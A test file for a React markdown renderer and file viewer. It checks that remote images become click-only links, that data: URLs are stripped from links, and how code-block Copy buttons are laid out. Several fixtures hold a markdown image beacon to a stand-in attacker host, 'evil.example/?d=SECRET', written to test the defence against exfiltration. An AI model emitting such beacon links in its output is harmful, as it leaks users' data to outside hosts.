import { cleanup, render, screen, within } from '@testing-library/react';
import { afterEach, describe, expect, it } from 'vitest';
import { FileViewer } from './FileViewer.js';
import { QuestMarkdown } from './markdown.js';

const PIXEL = 'data:image/png;base64,iVBORw0KGgo=';

describe('images in markdown', () => {
  afterEach(() => cleanup());

  it('never loads a remote image by itself: it is a link the user clicks', () => {
    const { container } = render(<QuestMarkdown>{'![a chart](https://evil.example/?d=SECRET)'}</QuestMarkdown>);
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: /a chart.*evil\.example/ }) as HTMLAnchorElement;
    expect(link.href).toBe('https://evil.example/?d=SECRET');
    expect(link.target).toBe('_blank');
    expect(link.rel).toContain('noreferrer');
  });

  it('treats a protocol-relative address as remote too', () => {
    const { container } = render(<QuestMarkdown>{'![x](//evil.example/a.png)'}</QuestMarkdown>);
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: /evil\.example/ })).toBeTruthy();
  });

  it('shows a data image and a same-origin image', () => {
    const { container } = render(<QuestMarkdown>{`![dot](${PIXEL})\n\n![icon](/favicon.svg)`}</QuestMarkdown>);
    const images = [...container.querySelectorAll('img')];
    expect(images.map((image) => image.getAttribute('src'))).toEqual([PIXEL, '/favicon.svg']);
  });

  it('keeps data out of links, where it could run', () => {
    render(<QuestMarkdown>{'[click](data:text/html,hello)'}</QuestMarkdown>);
    expect(screen.getByText('click').getAttribute('href')).toBe('');
  });

  it('leaves a badge inside a link as text, with no link inside a link', () => {
    const { container } = render(
      <QuestMarkdown>{'[![build](https://badge.example/b.svg)](https://ci.example/run)'}</QuestMarkdown>,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelectorAll('a')).toHaveLength(1);
    expect(container.querySelector('a')!.textContent).toMatch(/build/);
  });

  it('holds in a repo file shown in the viewer as well', () => {
    const { container } = render(
      <FileViewer
        file={{
          session: '11111111-1111-4111-8111-111111111111',
          requested: 'README.md',
          reply: {
            kind: 'file',
            requestId: '22222222-2222-4222-8222-222222222222',
            ok: true,
            content: '![x](https://evil.example/?d=SECRET)',
          },
        }}
        onClose={() => {}}
      />,
    );
    expect(container.querySelector('img')).toBeNull();
    expect(screen.getByRole('link', { name: /evil\.example/ })).toBeTruthy();
  });
});

describe('code blocks', () => {
  afterEach(() => cleanup());
  const block = '```sh\npnpm smoke --hub http://127.0.0.1:7700\n```';

  it('in the chat, have a header naming the language, with Copy', () => {
    const { container } = render(<QuestMarkdown>{block}</QuestMarkdown>);
    const header = container.querySelector('[data-code-header]')!;
    expect(header.textContent).toContain('sh');
    expect(within(header as HTMLElement).getByRole('button', { name: 'Copy code' })).toBeTruthy();
  });

  it('compact, as in an Errand, have no language row: a Copy chip with its icon beside the code', () => {
    const { container } = render(<QuestMarkdown compact>{block}</QuestMarkdown>);
    expect(container.querySelector('[data-code-header]')).toBeNull();
    expect(container.textContent).not.toMatch(/^sh/);
    const copy = screen.getByRole('button', { name: 'Copy code' });
    expect(copy.textContent).toBe('Copy');
    expect(copy.querySelector('.cb-icon-errandCopy')).toBeTruthy();
    expect(container.querySelector('pre')!.textContent).toBe('pnpm smoke --hub http://127.0.0.1:7700\n');
  });

  it('compact, keep the Copy chip off the code: beside it, never over it, with room at the end of the line', () => {
    const { container } = render(<QuestMarkdown compact>{block}</QuestMarkdown>);
    const pre = container.querySelector('pre')!;
    const copy = screen.getByRole('button', { name: 'Copy code' });
    // Siblings in a row: the code scrolls in its own box, which ends where the chip begins.
    expect(copy.parentElement).toBe(pre.parentElement);
    expect(pre.parentElement!.className).toMatch(/(^| )flex( |$)/);
    expect(pre.className).toContain('min-w-0');
    expect(pre.className).toContain('overflow-x-auto');
    expect(copy.className).toContain('shrink-0');
    expect(copy.className).not.toMatch(/\b(absolute|fixed|sticky)\b/);
    // Scrolled to its end, the last character doesn't sit flush against the chip.
    expect(pre.className).toContain('pr-2');
  });
});
